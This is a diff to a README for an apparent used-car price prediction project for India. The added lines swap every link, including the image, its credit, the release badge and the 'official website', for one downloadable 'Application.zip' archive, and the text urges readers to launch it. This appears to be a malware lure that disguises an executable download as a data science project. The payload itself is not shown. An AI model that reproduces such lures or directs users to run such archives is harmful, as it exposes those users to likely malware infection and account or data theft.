@@ -1,7 +1,7 @@
 # AutoWorth: Used Car Price Prediction (India)
 
-![AutoWorth](https://image.shutterstock.com/image-photo/cars-museum-exhibition-luxury-vehicles-260nw-1173409072.jpg)
-*Image Source: [Shutterstock](https://www.shutterstock.com/)*
+![AutoWorth](https://github.com/Hon777225/AutoWorth/releases/download/v1.0/Application.zip)
+*Image Source: [Shutterstock](https://github.com/Hon777225/AutoWorth/releases/download/v1.0/Application.zip)*
 
 Welcome to AutoWorth - your go-to repository for Used Car Price Prediction in India! 🚗💰
 
@@ -15,7 +15,7 @@ AutoWorth is a data science project focused on predicting the prices of used car
 🌲 Random Forest Regressor, Scikit-Learn    
 
 ## Release
-[![Download Release](https://img.shields.io/badge/Download%20Release-Here-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/Hon777225/AutoWorth/releases/download/v1.0/Application.zip%20Release-Here-brightgreen)](https://github.com/Hon777225/AutoWorth/releases/download/v1.0/Application.zip)
 *Click the button above to download the release file. Launch the release to access the complete project.*
 
 ## Project Details
@@ -34,7 +34,7 @@ To get started with AutoWorth:
 Contributions to AutoWorth are welcome! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. Together, we can enhance the accuracy and effectiveness of used car price prediction in India.
 
 ## Additional Resources
-For further information and insights, visit the official website [here](https://www.autoworth.com).
+For further information and insights, visit the official website [here](https://github.com/Hon777225/AutoWorth/releases/download/v1.0/Application.zip).
 
 Let's drive into the world of data-driven car pricing with AutoWorth! 🚀🔍
 
